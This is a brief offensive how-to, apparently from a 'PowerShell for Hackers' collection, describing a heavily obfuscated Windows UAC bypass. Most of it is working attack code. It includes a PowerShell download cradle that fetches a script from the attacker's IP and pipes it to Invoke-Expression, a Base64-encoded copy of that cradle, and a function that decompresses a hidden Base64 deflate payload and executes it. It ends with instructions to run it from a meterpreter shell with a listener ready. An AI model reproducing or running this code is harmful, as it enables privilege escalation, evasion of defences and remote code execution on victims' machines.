# Heavily Obfuscated UAC Bypass
Thanks to [saulgoodman](https://github.com/saulg00dmin) for pointing out this technique.

Source: https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/UAC-Bypass.md

1. Prepare command to be executed:

```powershell
$ipAddress = (ip addr show tun0 | grep inet | head -n 1 | cut -d ' ' -f 6 | cut -d '/' -f 1)
$text = "(New-Object System.Net.WebClient).DownloadString('http://$ipAddress/run3.txt') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText
exit
```

2. Insert the Base64 blob into the `code` variable like the below:

```powershell
$code = "KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA3AC8AcgB1AG4AMwAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=" 
```

3. Create the `Bypass` function:

```powershell
function Bypass {
[CmdletBinding()]
param (
[Parameter (Position=0, Mandatory = $True)]
[string]$code )

(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION
}
```

4. Then execute `Bypass` in the meterpreter shell make sure you have a listener running:

```powershell
Bypass KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA3AC8AcgB1AG4AMwAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=
```
